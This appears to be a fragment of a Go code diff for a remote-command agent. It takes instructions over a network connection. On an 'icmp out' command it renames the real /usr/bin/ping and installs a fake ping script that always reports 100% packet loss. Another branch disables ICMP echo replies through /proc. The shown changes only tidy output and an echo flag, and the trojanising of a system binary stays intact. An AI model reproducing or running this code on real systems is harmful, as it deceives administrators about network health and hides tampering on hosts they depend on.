@@ -148,10 +148,8 @@ func EstablishConnection(port string) {
 							}
 						}
 					case "icmp":
-						fmt.Println("got here")
 						switch brks[1] {
 						case "out":
-							// TODO add this
 							newPingFile :=
 								"#!/usr/bin/sh\\n" +
 									"echo PING $1 ($1) 56(84) bytes of data.\\n" +
@@ -159,13 +157,12 @@ func EstablishConnection(port string) {
 									"echo\\necho \"--- $1 ping statistics ---\"\\n" +
 									"echo \"1 packets transmitted, 0 received, 100% packet loss, time 0ms\"\\n" +
 									"echo\\necho"
-							fmt.Println("Starting...")
 							ExecuteList([]string{
 								"mv /usr/bin/ping /usr/bin/fpings",
-								"echo -e '" + newPingFile + "' > /usr/bin/ping",
+								"echo '" + newPingFile + "' > /usr/bin/ping",
 								"chmod +x /usr/bin/ping",
 							})
-							respond("ICMP out disabled.", conn)
+							respond("ICMP out disabled.\n", conn)
 						default:
 							Execute(FormatCommand("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"))
 							respond("ICMP Disabled.\n", conn)
